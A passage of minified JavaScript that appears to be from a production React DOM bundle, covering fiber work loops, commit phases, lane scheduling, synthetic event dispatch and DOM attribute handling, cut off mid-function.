Z0(){var e=I.H;return I.H=ts,e===null?ts:e}function X0(){var e=I.A;return I.A=Ry,e}function Ts(){Ye=4,tn||(pe&4194048)!==pe&&lt.current!==null||(Tl=!0),(an&134217727)===0&&(kn&134217727)===0||Ue===null||ln(Ue,pe,Ot,!1)}function nu(e,t,a){var n=Ee;Ee|=2;var i=Z0(),s=X0();(Ue!==e||pe!==t)&&(_s=null,Cl(e,t)),t=!1;var u=Ye;e:do try{if(ze!==0&&fe!==null){var h=fe,x=zt;switch(ze){case 8:au(),u=6;break e;case 3:case 2:case 9:case 6:lt.current===null&&(t=!0);var N=ze;if(ze=0,zt=null,zl(e,h,x,N),a&&Tl){u=0;break e}break;default:N=ze,ze=0,zt=null,zl(e,h,x,N)}}My(),u=Ye;break}catch(O){q0(e,O)}while(!0);return t&&e.shellSuspendCounter++,ja=An=null,Ee=n,I.H=i,I.A=s,fe===null&&(Ue=null,pe=0,zr()),u}function My(){for(;fe!==null;)V0(fe)}function Hy(e,t){var a=Ee;Ee|=2;var n=Z0(),i=X0();Ue!==e||pe!==t?(_s=null,bs=Tt()+500,Cl(e,t)):Tl=Pl(e,t);e:do try{if(ze!==0&&fe!==null){t=fe;var s=zt;t:switch(ze){case 1:ze=0,zt=null,zl(e,t,s,1);break;case 2:case 9:if(Qd(s)){ze=0,zt=null,Q0(t);break}t=function(){ze!==2&&ze!==9||Ue!==e||(ze=7),da(e)},s.then(t,t);break e;case 3:ze=7;break e;case 4:ze=5;break e;case 7:Qd(s)?(ze=0,zt=null,Q0(t)):(ze=0,zt=null,zl(e,t,s,7));break;case 5:var u=null;switch(fe.tag){case 26:u=fe.memoizedState;case 5:case 27:var h=fe;if(u?Bp(u):h.stateNode.complete){ze=0,zt=null;var x=h.sibling;if(x!==null)fe=x;else{var N=h.return;N!==null?(fe=N,ws(N)):fe=null}break t}}ze=0,zt=null,zl(e,t,s,5);break;case 6:ze=0,zt=null,zl(e,t,s,6);break;case 8:au(),Ye=6;break e;default:throw Error(o(462))}}By();break}catch(O){q0(e,O)}while(!0);return ja=An=null,I.H=n,I.A=i,Ee=a,fe!==null?0:(Ue=null,pe=0,zr(),Ye)}function By(){for(;fe!==null&&!ev();)V0(fe)}function V0(e){var t=s0(e.alternate,e,Da);e.memoizedProps=e.pendingProps,t===null?ws(e):fe=t}function Q0(e){var t=e,a=t.alternate;switch(t.tag){case 15:case 0:t=e0(a,t,t.pendingProps,t.type,void 0,pe);break;case 11:t=e0(a,t,t.pendingProps,t.type.render,t.ref,pe);break;case 5:oo(t);var n=t;n===Pe&&(ue?(Hr(n),n.tag===5&&n.stateNode!=null&&(He=n.stateNode)):(Hr(n),ue=!0));default:o0(a,t),t=fe=Md(t,Da),t=s0(a,t,Da)}e.memoizedProps=e.pendingProps,t===null?ws(e):fe=t}function zl(e,t,a,n){ja=An=null,oo(t),ml=null,mi=0;var i=t.return;try{if(wy(e,i,t,a,pe)){Ye=1,as(e,kt(a,e.current)),fe=null;return}}catch(s){if(i!==null)throw fe=i,s;Ye=1,as(e,kt(a,e.current)),fe=null;return}t.flags&32768?(ue||n===1?e=!0:Tl||(pe&536870912)!==0?e=!1:(tn=e=!0,(n===2||n===9||n===3||n===6)&&(n=lt.current,n!==null&&n.tag===13&&(n.flags|=16384))),K0(t,e)):ws(t)}function ws(e){var t=e;do{if((t.flags&32768)!==0){K0(t,tn);return}e=t.return;var a=Ny(t.alternate,t,Da);if(a!==null){fe=a;return}if(t=t.sibling,t!==null){fe=t;return}fe=t=e}while(t!==null);Ye===0&&(Ye=5)}function K0(e,t){do{var a=Cy(e.alternate,e);if(a!==null){a.flags&=32767,fe=a;return}if(a=e.return,a!==null&&(a.flags|=32768,a.subtreeFlags=0,a.deletions=null),!t&&(e=e.sibling,e!==null)){fe=e;return}fe=e=a}while(e!==null);Ye=6,fe=null}function I0(e,t,a,n,i,s,u,h,x,N,O,D){e.cancelPendingCommit=null;do Es();while(Ge!==0);if((Ee&6)!==0)throw Error(o(327));if(t!==null){if(t===e.current)throw Error(o(177));e===Ue&&(fe=Ue=null,pe=0),Ln=t,$t=e,fa=a,tu=i,B0=n,ky(e,t,a,u,h,x,D)}}function ky(e,t,a,n,i,s,u){var h=t.lanes|t.childLanes;if(eu=h,h|=Bc,uv(e,a,h,n,i,s),Al=null,(a&335544064)===a?(jl=dy(e),n=10262):(jl=null,n=10256),(t.subtreeFlags&n)!==0||(t.flags&n)!==0?(e.callbackNode=null,e.callbackPriority=0,Xy(hr,function(){return su(),null})):(e.callbackNode=null,e.callbackPriority=0),us=!1,n=(t.flags&13878)!==0,(t.subtreeFlags&13878)!==0||n){n=I.T,I.T=null,i=re.p,re.p=2,s=Ee,Ee|=4;try{zy(e,t,a)}finally{Ee=s,re.p=i,I.T=n}}Ge=1,us?El=ub(u,e.containerInfo,jl,lu,iu,Gy,ru,su,Ly):(lu(),iu(),ru())}function Ly(e){if(Ge!==0){var t=$t.onRecoverableError;t(e,{componentStack:null})}}function Gy(){Ge===3&&(Ge=0,z0(Ln,$t),Ge=4)}function lu(){if(Ge===1){Ge=0;var e=$t,t=Ln,a=fa,n=(t.flags&13878)!==0;if((t.subtreeFlags&13878)!==0||n){n=I.T,I.T=null;var i=re.p;re.p=2;var s=Ee;Ee|=4;try{ji=hs=!1,N0(t,e,a),a=bu;var u=Ed(e.containerInfo),h=a.focusedElem,x=a.selectionRange;if(u!==h&&h&&h.ownerDocument&&wd(h.ownerDocument.documentElement,h)){if(x!==null&&Rc(h)){var N=x.start,O=x.end;if(O===void 0&&(O=N),"selectionStart"in h)h.selectionStart=N,h.selectionEnd=Math.min(O,h.value.length);else{var D=h.ownerDocument||document,A=D&&D.defaultView||window;if(A.getSelection){var z=A.getSelection(),L=h.textContent.length,Z=Math.min(x.start,L),oe=x.end===void 0?Z:Math.min(x.end,L);!z.extend&&Z>oe&&(u=oe,oe=Z,Z=u);var j=Td(h,Z),S=Td(h,oe);if(j&&S&&(z.rangeCount!==1||z.anchorNode!==j.node||z.anchorOffset!==j.offset||z.focusNode!==S.node||z.focusOffset!==S.offset)){var C=D.createRange();C.setStart(j.node,j.offset),z.removeAllRanges(),Z>oe?(z.addRange(C),z.extend(S.node,S.offset)):(C.setEnd(S.node,S.offset),z.addRange(C))}}}}for(D=[],z=h;z=z.parentNode;)z.nodeType===1&&D.push({element:z,left:z.scrollLeft,top:z.scrollTop});for(typeof h.focus=="function"&&h.focus(),h=0;h<D.length;h++){var R=D[h];R.element.scrollLeft=R.left,R.element.scrollTop=R.top}}kl=!!yu,bu=yu=null}finally{Ee=s,re.p=i,I.T=n}}e.current=t,Ge=2}}function iu(){if(Ge===2){Ge=0;var e=$t,t=Ln,a=(t.flags&8772)!==0;if((t.subtreeFlags&8772)!==0||a){a=I.T,I.T=null;var n=re.p;re.p=2;var i=Ee;Ee|=4;try{S0(e,t.alternate,t)}finally{Ee=i,re.p=n,I.T=a}}Ge=3}}function ru(){if(Ge===4||Ge===3){Ge=0;var e=El;El=null,tv();var t=$t,a=Ln,n=fa,i=B0,s=(n&335544064)===n?10262:10256;if((a.subtreeFlags&s)!==0||(a.flags&s)!==0?Ge=5:(Ge=0,Ln=$t=null,F0(t,t.pendingLanes)),s=t.pendingLanes,s===0&&(nn=null),pc(n),a=a.stateNode,wt&&typeof wt.onCommitFiberRoot=="function")try{wt.onCommitFiberRoot(Jl,a,void 0,(a.current.flags&128)===128)}catch{}if(i!==null){a=I.T,s=re.p,re.p=2,I.T=null;try{for(var u=t.onRecoverableError,h=0;h<i.length;h++){var x=i[h];u(x.value,{componentStack:x.stack})}}finally{I.T=a,re.p=s}}if(i=Al,u=jl,jl=null,i!==null&&(Al=null,u===null&&(u=[]),e!==null))for(x=0;x<i.length;x++)a=(0,i[x])(u),a!==void 0&&e.finished.finally(a);(fa&3)!==0&&Es(),da(t),s=t.pendingLanes,(n&261930)!==0&&(s&42)!==0?t===xs?Oi++:(Oi=0,xs=t):(Oi=0,xs=null),Ri(0)}}function F0(e,t){(e.pooledCacheLanes&=t)===0&&(t=e.pooledCache,t!=null&&(e.pooledCache=null,di(t)))}function Es(){return El!==null&&(El.skipTransition(),El=null),lu(),iu(),ru(),su()}function su(){if(Ge!==5)return!1;var e=$t,t=eu;eu=0;var a=pc(fa),n=I.T,i=re.p;try{re.p=32>a?32:a,I.T=null,a=tu,tu=null;var s=$t,u=fa;if(Ge=0,Ln=$t=null,fa=0,(Ee&6)!==0)throw Error(o(331));var h=Ee;if(Ee|=4,U0(s.current),O0(s,s.current,u,a),Ee=h,Ri(0,!1),wt&&typeof wt.onPostCommitFiberRoot=="function")try{wt.onPostCommitFiberRoot(Jl,s)}catch{}return!0}finally{re.p=i,I.T=n,F0(e,t)}}function J0(e,t,a){t=kt(a,t),t=wo(e.stateNode,t,2),e=Fa(e,t,2),e!==null&&($l(e,2),da(e))}function Oe(e,t,a){if(e.tag===3)J0(e,e,a);else for(;t!==null;){if(t.tag===3){J0(t,e,a);break}else if(t.tag===1){var n=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof n.componentDidCatch=="function"&&(nn===null||!nn.has(n))){e=kt(a,e),a=Qh(2),n=Fa(t,a,2),n!==null&&(Kh(a,n,t,e),$l(n,2),da(n));break}}t=t.return}}function cu(e,t,a){var n=e.pingCache;if(n===null){n=e.pingCache=new Dy;var i=new Set;n.set(t,i)}else i=n.get(t),i===void 0&&(i=new Set,n.set(t,i));i.has(a)||($o=!0,i.add(a),e=qy.bind(null,e,t,a),t.then(e,e))}function qy(e,t,a){var n=e.pingCache;n!==null&&n.delete(t),e.pingedLanes|=e.suspendedLanes&a,e.warmLanes&=~a,Ue===e&&(pe&a)===a&&((Ye===4||Ye===3&&(pe&62914560)===pe&&300>Tt()-ys)&&(Ee&2)===0?Cl(e,0):vs|=a,wl===pe&&(wl=0)),da(e)}function P0(e,t){t===0&&(t=Hf()),e=Tn(e,t),e!==null&&($l(e,t),da(e))}function Yy(e){var t=e.memoizedState,a=0;t!==null&&(a=t.retryLane),P0(e,a)}function Zy(e,t){var a=0;switch(e.tag){case 31:case 13:var n=e.stateNode,i=e.memoizedState;i!==null&&(a=i.retryLane);break;case 19:n=e.stateNode;break;case 22:n=e.stateNode._retryCache;break;default:throw Error(o(314))}n!==null&&n.delete(t),P0(e,a)}function Xy(e,t){return uc(e,t)}var Ol=null,Rl=null,ou=!1,As=!1,uu=!1,rn=0;function da(e){e!==Rl&&e.next===null&&(Rl===null?Ol=Rl=e:Rl=Rl.next=e),As=!0,ou||(ou=!0,Qy())}function Ri(e,t){if(!uu&&As){uu=!0;do for(var a=!1,n=Ol;n!==null;){if(e!==0){var i=n.pendingLanes;if(i===0)var s=0;else{var u=n.suspendedLanes,h=n.pingedLanes;s=(1<<31-Et(42|e)+1)-1,s&=i&~(u&~h),s=s&201326741?s&201326741|1:s?s|2:0}s!==0&&(a=!0,tp(n,s))}else s=pe,s=vr(n,n===Ue?s:0,n.cancelPendingCommit!==null||n.timeoutHandle!==-1),(s&3)===0||Pl(n,s)||(a=!0,tp(n,s));n=n.next}while(a);uu=!1}}function Vy(){$0()}function $0(){As=ou=!1;var e=0;rn!==0&&nb()&&(e=rn);for(var t=Tt(),a=null,n=Ol;n!==null;){var i=n.next,s=W0(n,t);s===0?(n.next=null,a===null?Ol=i:a.next=i,i===null&&(Rl=a)):(a=n,(e!==0||(s&3)!==0)&&(As=!0)),n=i}Ge!==0&&Ge!==5||Ri(e),rn!==0&&(rn=0)}function W0(e,t){for(var a=e.suspendedLanes,n=e.pingedLanes,i=e.expirationTimes,s=e.pendingLanes&-62914561;0<s;){var u=31-Et(s),h=1<<u,x=i[u];x===-1?((h&a)===0||(h&n)!==0)&&(i[u]=ov(h,t)):x<=t&&(e.expiredLanes|=h),s&=~h}if(t=Ue,a=pe,a=vr(e,e===t?a:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),n=e.callbackNode,a===0||e===t&&(ze===2||ze===9)||e.cancelPendingCommit!==null)return n!==null&&n!==null&&fc(n),e.callbackNode=null,e.callbackPriority=0;if((a&3)===0||Pl(e,a)){if(t=a&-a,t===e.callbackPriority)return t;switch(n!==null&&fc(n),pc(a)){case 2:case 8:a=Df;break;case 32:a=hr;break;case 268435456:a=Uf;break;default:a=hr}return n=ep.bind(null,e),a=uc(a,n),e.callbackPriority=t,e.callbackNode=a,t}return n!==null&&n!==null&&fc(n),e.callbackPriority=2,e.callbackNode=null,2}function ep(e,t){if(Ge!==0&&Ge!==5)return e.callbackNode=null,e.callbackPriority=0,null;var a=e.callbackNode;if(Es()&&e.callbackNode!==a)return null;var n=pe;return n=vr(e,e===Ue?n:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),n===0?null:(L0(e,n,t),W0(e,Tt()),e.callbackNode!=null&&e.callbackNode===a?ep.bind(null,e):null)}function tp(e,t){if(Es())return null;L0(e,t,!0)}function Qy(){ib(function(){(Ee&6)!==0?uc(Rf,Vy):$0()})}function fu(){if(rn===0){var e=Cn;e===0&&(e=pr,pr<<=1,(pr&261888)===0&&(pr=256)),rn=e}return rn}function ap(e){return e==null||typeof e=="symbol"||typeof e=="boolean"?null:typeof e=="function"?e:Sr(e)}function Ky(e,t,a,n,i){if(t==="submit"&&a&&a.stateNode===i){var s=ap((i[gt]||null).action),u=n.submitter;u&&(t=(t=u[gt]||null)?ap(t.formAction):u.getAttribute("formAction"),t!==null&&(s=t,u=null));var h=new Ar("action","action",null,n,i);e.push({event:h,listeners:[{instance:null,listener:function(){if(n.defaultPrevented){if(rn!==0){var x=new FormData(i,u);bo(a,{pending:!0,data:x,method:i.method,action:s},null,x)}}else typeof s=="function"&&(h.preventDefault(),x=new FormData(i,u),bo(a,{pending:!0,data:x,method:i.method,action:s},s,x))},currentTarget:i}]})}}for(var du=0;du<Hc.length;du++){var hu=Hc[du],Iy=hu.toLowerCase(),Fy=hu[0].toUpperCase()+hu.slice(1);It(Iy,"on"+Fy)}It(Nd,"onAnimationEnd"),It(Cd,"onAnimationIteration"),It(zd,"onAnimationStart"),It("dblclick","onDoubleClick"),It("focusin","onFocus"),It("focusout","onBlur"),It(ly,"onTransitionRun"),It(iy,"onTransitionStart"),It(ry,"onTransitionCancel"),It(Od,"onTransitionEnd"),el("onMouseEnter",["mouseout","mouseover"]),el("onMouseLeave",["mouseout","mouseover"]),el("onPointerEnter",["pointerout","pointerover"]),el("onPointerLeave",["pointerout","pointerover"]),_n("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),_n("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),_n("onBeforeInput",["compositionend","keypress","textInput","paste"]),_n("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),_n("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),_n("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Di="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Jy=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(Di));function np(e,t){t=(t&4)!==0;for(var a=0;a<e.length;a++){var n=e[a],i=n.event;n=n.listeners;e:{var s=void 0;if(t)for(var u=n.length-1;0<=u;u--){var h=n[u],x=h.instance,N=h.currentTarget;if(h=h.listener,x!==s&&i.isPropagationStopped())break e;s=h,i.currentTarget=N;try{s(i)}catch(O){Cr(O)}i.currentTarget=null,s=x}else for(u=0;u<n.length;u++){if(h=n[u],x=h.instance,N=h.currentTarget,h=h.listener,x!==s&&i.isPropagationStopped())break e;s=h,i.currentTarget=N;try{s(i)}catch(O){Cr(O)}i.currentTarget=null,s=x}}}}function de(e,t){var a=t[Yf];a===void 0&&(a=t[Yf]=new Set);var n=e+"__bubble";a.has(n)||(lp(t,e,2,!1),a.add(n))}function pu(e,t,a){var n=0;t&&(n|=4),lp(a,e,n,t)}var js="_reactListening"+Math.random().toString(36).slice(2);function mu(e){if(!e[js]){e[js]=!0,Vf.forEach(function(a){a!=="selectionchange"&&(Jy.has(a)||pu(a,!1,e),pu(a,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[js]||(t[js]=!0,pu("selectionchange",!1,t))}}function lp(e,t,a,n){switch(Kp(t)){case 2:var i=Yb;break;case 8:i=Zb;break;default:i=Mu}a=i.bind(null,t,a,e),i=void 0,!Sc||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(i=!0),n?i!==void 0?e.addEventListener(t,a,{capture:!0,passive:i}):e.addEventListener(t,a,!0):i!==void 0?e.addEventListener(t,a,{passive:i}):e.addEventListener(t,a,!1)}function gu(e,t,a,n,i){var s=n;if((t&1)===0&&(t&2)===0&&n!==null)e:for(;;){if(n===null)return;var u=n.tag;if(u===3||u===4){var h=n.stateNode.containerInfo;if(h===i)break;if(u===4)for(u=n.return;u!==null;){var x=u.tag;if((x===3||x===4)&&u.stateNode.containerInfo===i)return;u=u.return}for(;h!==null;){if(u=bn(h),u===null)return;if(x=u.tag,x===5||x===6||x===26||x===27){n=s=u;continue e}h=h.parentNode}}n=n.return}ld(function(){var N=s,O=_c(a),D=[];e:{var A=Rd.get(e);if(A!==void 0){var z=Ar,L=e;switch(e){case"keypress":if(wr(a)===0)break e;case"keydown":case"keyup":z=Uv;break;case"focusin":L="focus",z=Ac;break;case"focusout":L="blur",z=Ac;break;case"beforeblur":case"afterblur":z=Ac;break;case"click":if(a.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":z=sd;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":z=Sv;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":z=Lv;break;case Nd:case Cd:case zd:z=Ev;break;case Od:z=qv;break;case"scroll":case"scrollend":z=_v;break;case"wheel":z=Zv;break;case"copy":case"cut":case"paste":z=jv;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":z=od;break;case"submit":z=Bv;break;case"toggle":case"beforetoggle":z=Vv}var Z=(t&4)!==0,oe=!Z&&(e==="scroll"||e==="scrollend"),j=Z?A!==null?A+"Capture":null:A;Z=[];for(var S=N,C;S!==null;){var R=S;if(C=R.stateNode,R=R.tag,R!==5&&R!==26&&R!==27||C===null||j===null||(R=ti(S,j),R!=null&&Z.push(Ui(S,R,C))),oe)break;S=S.return}0<Z.length&&(A=new z(A,L,null,a,O),D.push({event:A,listeners:Z}))}}if((t&7)===0){e:{if(z=e==="mouseover"||e==="pointerover",A=e==="mouseout"||e==="pointerout",z&&a!==bc&&(L=a.relatedTarget||a.fromElement)&&(bn(L)||L[Pn]))break e;(A||z)&&(L=O.window===O?O:(z=O.ownerDocument)?z.defaultView||z.parentWindow:window,A?(z=a.relatedTarget||a.toElement,A=N,z=z?bn(z):null,z!==null&&(oe=f(z),Z=z.tag,z!==oe||Z!==5&&Z!==27&&Z!==6)&&(z=null)):(A=null,z=N),A!==z&&(Z=sd,R="onMouseLeave",j="onMouseEnter",S="mouse",(e==="pointerout"||e==="pointerover")&&(Z=od,R="onPointerLeave",j="onPointerEnter",S="pointer"),oe=A==null?L:ei(A),C=z==null?L:ei(z),L=new Z(R,S+"leave",A,a,O),L.target=oe,L.relatedTarget=C,R=null,bn(O)===N&&(Z=new Z(j,S+"enter",z,a,O),Z.target=C,Z.relatedTarget=oe,R=Z),oe=R,Z=A&&z?he(A,z,Py):null,A!==null&&ip(D,L,A,Z,!1),z!==null&&oe!==null&&ip(D,oe,z,Z,!0)))}e:{if(A=N?ei(N):window,z=A.nodeName&&A.nodeName.toLowerCase(),z==="select"||z==="input"&&A.type==="file")var Y=vd;else if(md(A))if(yd)Y=ty;else{Y=Wv;var me=$v}else z=A.nodeName,!z||z.toLowerCase()!=="input"||A.type!=="checkbox"&&A.type!=="radio"?N&&yc(N.elementType)&&(Y=vd):Y=ey;if(Y&&(Y=Y(e,N))){gd(D,Y,a,O);break e}me&&me(e,A,N)}switch(me=N?ei(N):window,e){case"focusin":(md(me)||me.contentEditable==="true")&&(rl=me,Dc=N,oi=null);break;case"focusout":oi=Dc=rl=null;break;case"mousedown":Uc=!0;break;case"contextmenu":case"mouseup":case"dragend":Uc=!1,Ad(D,a,O);break;case"selectionchange":if(ny)break;case"keydown":case"keyup":Ad(D,a,O)}var J;if(Nc)e:{switch(e){case"compositionstart":var ne="onCompositionStart";break e;case"compositionend":ne="onCompositionEnd";break e;case"compositionupdate":ne="onCompositionUpdate";break e}ne=void 0}else il?hd(e,a)&&(ne="onCompositionEnd"):e==="keydown"&&a.keyCode===229&&(ne="onCompositionStart");ne&&(ud&&a.locale!=="ko"&&(il||ne!=="onCompositionStart"?ne==="onCompositionEnd"&&il&&(J=id()):(Ga=O,Tc="value"in Ga?Ga.value:Ga.textContent,il=!0)),me=Ns(N,ne),0<me.length&&(ne=new cd(ne,e,null,a,O),D.push({event:ne,listeners:me}),J?ne.data=J:(J=pd(a),J!==null&&(ne.data=J)))),(J=Kv?Iv(e,a):Fv(e,a))&&(ne=Ns(N,"onBeforeInput"),0<ne.length&&(me=new cd("onBeforeInput","beforeinput",null,a,O),D.push({event:me,listeners:ne}),me.data=J)),Ky(D,e,N,a,O)}np(D,t)})}function Ui(e,t,a){return{instance:e,listener:t,currentTarget:a}}function Ns(e,t){for(var a=t+"Capture",n=[];e!==null;){var i=e,s=i.stateNode;if(i=i.tag,i!==5&&i!==26&&i!==27||s===null||(i=ti(e,a),i!=null&&n.unshift(Ui(e,i,s)),i=ti(e,t),i!=null&&n.push(Ui(e,i,s))),e.tag===3)return n;e=e.return}return[]}function Py(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5&&e.tag!==27);return e||null}function ip(e,t,a,n,i){for(var s=t._reactName,u=[];a!==null&&a!==n;){var h=a,x=h.alternate,N=h.stateNode;if(h=h.tag,x!==null&&x===n)break;h!==5&&h!==26&&h!==27||N===null||(x=N,i?(N=ti(a,s),N!=null&&u.unshift(Ui(a,N,x))):i||(N=ti(a,s),N!=null&&u.push(Ui(a,N,x)))),a=a.return}u.length!==0&&e.push({event:t,listeners:u})}var $y=/\r\n?/g,Wy=/\u0000|\uFFFD/g;function rp(e){return(typeof e=="string"?e:""+e).replace($y,`
`).replace(Wy,"")}function sp(e,t){return t=rp(t),rp(e)===t}function Re(e,t,a,n,i,s){switch(a){case"children":if(typeof n=="string")t==="body"||t==="textarea"&&n===""||al(e,n);else if(typeof n=="number"||typeof n=="bigint")t!=="body"&&al(e,""+n);else return;break;case"className":xr(e,"class",n);break;case"tabIndex":xr(e,"tabindex",n);break;case"dir":case"role":case"viewBox":case"width":case"height":xr(e,a,n);break;case"style":ad(e,n,s);return;case"data":if(t!=="object"){xr(e,"data",n);break}case"src":case"href":if(n===""&&(t!=="a"||a!=="href")){e.removeAttribute(a);break}if(n==null||typeof n=="function"||typeof n=="symbol"||typeof n=="boolean"){e.removeAttribute(a);break}n=Sr(n),e.setAttribute(a,n);break;case"action":case"formAction":if(typeof n=="function"){e.setAttribute(a,"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");break}else typeof s=="function"&&(a==="formAction"?(t!=="input"&&Re(e,t,"name",i.name,i,null),Re(e,t,"formEncType",i.formEncType,i,null),Re(e,t,"formMethod",i.formMethod,i,null),Re(e,t,"formTarget",i.formTarget,i,null)):(Re(e,t,"encType",i.encType,i,null),Re(e,t,"method",i.method,i,null),Re(e,t,"target",i.target,i,null)));if(n==null||typeof n=="symbol"||typeof n=="boolean"){e.removeAttribute(a);break}n=Sr(n),e.setAttribute(a,n);break;case"onClick":n!=null&&(e.onclick=aa);return;case"onScroll":n!=null&&de("scroll",e);return;case"onScrollEnd":n!=null&&de("scrollend",e);return;case"dangerouslySetInnerHTML":if(n!=null){if(typeof n!="object"||!("__html"in n))throw Error(o(61));if(a=n.__html,a!=null){if(i.children!=null)throw Error(o(60));(s!=null?s.__html:void 0)!==a&&(e.innerHTML=a)}}break;case"multiple":e.multiple=n&&typeof n!="function"&&typeof n!="symbol";break;case"muted":e.muted=n&&typeof n!="function"&&typeof n!="symbol";break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"defaultValue":case"defaultChecked":case"innerHTML":case"ref":break;case"autoFocus":break;case"xlinkHref":if(n==null||typeof n=="function"||typeof n=="boolean"||typeof n=="symbol"){e.removeAttribute("xlink:href");break}a=Sr(n),e.setAttributeNS("http://www.w3.org/1999/xlink","xlink:href",a);break;case"contentEditable":case"spellCheck":case"draggable":case"value":case"autoReverse":case"externalResourcesRequired":case"focusable":case"preserveAlpha":n!=null&&typeof n!="function"&&typeof n!="symbol"?e.setAttribute(a,n):e.removeAttribute(a);break;case"inert":case"allowFullScreen":case"async":case"autoPlay":case"controls":case"credentialless":case"default":case"defer":case"disabled":case"disablePictureInPicture":case"disableRemotePlayback":case"formNoValidate":case"hidden":case"loop":case"noModule":case"noValidate":case"open":case"playsInline":case"readOnly":case"required":case"reversed":case"scoped":case"seamless":case"itemScope":n&&typeof n!="function"&&typeof n!="symbol"?e.setAttribute(a,""):e.removeAttribute(a);break;case"capture":case"download":n===!0?e.setAttribute(a,""):n!==!1&&n!=null&&typeof n!="function"&&typeof n!="symbol"?e.setAttribute(a,n):e.removeAttribute(a);break;case"cols":case"rows":case"size":case"span":n!=null&&typeof n!="function"&&typeof n!="symbol"&&!isNaN(n)&&1<=n?e.setAttribute(a,n):e.removeAttribute(a);break;case"rowSpan":case"start":n==null||typeof n=="function"||typeof n=="symbol"||isNaN(n)?e.removeAttribute(a):e.setAttribute(a,n);break;case"popover":de("beforetoggle",e),de("toggle",e),_r(e,"popover",n);break;case"xlinkActuate":xa(e,"http://www.w3.org/1999/xlink","xlink:actuate",n);break;case"xlinkArcrole":xa(e,"http://www.w3.org/1999/xlink","xlink:arcrole",n);break;case"xlinkRole":xa(e,"http://www.w3.org/1999/xlink","xlink:role",n);break;case"xlinkShow":xa(e,"http://www.w3.org/1999/xlink","xlink:show",n);break;case"xlinkTitle":xa(e,"http://www.w3.org/1999/xlink","xlink:title",n);break;case"xlinkType":xa(e,"http://www.w3.org/1999/xlink","xlink:type",n);break;case"xmlBase":xa(e,"http://www.w3.org/XML/1998/namespace","xml:base",n);break;case"xmlLang":xa(e,"http://www.w3.org/XML/1998/namespace","xml:lang",n);break;case"xmlSpace":xa(e,"http://www.w3.org/XML/1998/namespace","xml:space",n);break;case"is":_r(e,"is",n);break;case"innerText":case"textContent":return;default:if(!(2<a.length)||a[0]!=="o"&&a[0]!=="O"||a[1]!=="n"&&a[1]!=="N")a=yv.get(a)||a,_r(e,a,n);else return}Se=!0}function vu(e,t,a,n,i,s){switch(a){case"style":ad(e,n,s);return;case"dangerouslySetInnerHTML":if(n!=null){if(typeof n!="object"||!("__html"in n))throw Error(o(61));if(a=n.__html,a!=null){if(i.children!=null)throw Error(o(60));(s!=null?s.__html:void 0)!==a&&(e.innerHTML=a)}}break;case"children":if(typeof n=="string")al(e,n);else if(typeof n=="number"||typeof n=="bigint")al(e,""+n);else return;break;case"onScroll":n!=null&&de("scroll",e);return;case"onScrollEnd":n!=null&&de("scrollend",e);return;case"onClick":n!=null&&(e.onclick=aa);return;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"innerHTML":case"ref":return;case"innerText":case"textContent":return;default:if(!Qf.hasOwnProperty(a))e:{if(a[0]==="o"&&a[1]==="n"&&(i=a.endsWith("Capture"),s=a.slice(2,i?a.length-7:void 0),t=e[gt]||null,t=t!=null?t[a]:null,typeof t=="function"&&e.removeEventListener(s,t,i),typeof n=="function")){typeof t!="function"&&t!==null&&(a in e?e[a]=null:e.hasAttribute(a)&&e.removeAttribute(a)),e.addEventListener(s,n,i);break e}Se=!0,a in e?e[a]=n:n===!0?e.setAttribute(a,""):_r(e,a,n)}return}Se=!0}function st(e,t,a){switch(t){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"img":de("error",e),de("load",e);var n=!1,i=!1,s;for(s in a)if(a.hasOwnProperty(s)){var u=a[s];if(u!=null)switch(s){case"src":n=!0;break;case"srcSet":i=!0;break;case"children":case"dangerouslySetInnerHTML":throw Error(o(137,t));default:Re(e,t,s,u,a,null)}}i&&Re(e,t,"srcSet",a.srcSet,a,null),n&&Re(e,t,"src",a.src,a,null);return;case"input":de("invalid",e);var h=s=u=i=null,x=null,N=null;for(n in a)if(a.hasOwnProperty(n)){var O=a[n];if(O!=null)switch(n){case"name":i=O;break;case"type":u=O;break;case"checked":x=O;break;case"defaultChecked":N=O;break;case"value":s=O;break;case"defaultValue":h=O;break;case"children":case"dangerouslySetInnerHTML":if(O!=null)throw Error(o(137,t));break;default:Re(e,t,n,O,a,null)}}$f(e,s,h,x,N,u,i,!1);return;case"select":de("invalid",e),n=u=s=null;for(i in a)if(a.hasOwnProperty(i)&&(h=a[i],h!=null))switch(i){case"value":s=h;break;case"defaultValue":u=h;break;case"multiple":n=h;default:Re(e,t,i,h,a,null)}t=s,a=u,e.multiple=!!n,t!=null?tl(e,!!n,t,!1):a!=null&&tl(e,!!n,a,!0);return;case"textarea":de("invalid",e),s=i=n=null;for(u in a)if(a.hasOwnProperty(u)&&(h=a[u],h!=null))switch(u){case"value":n=h;break;case"defaultValue":i=h;break;case"children":s=h;break;case"dangerouslySetInnerHTML":if(h!=null)throw 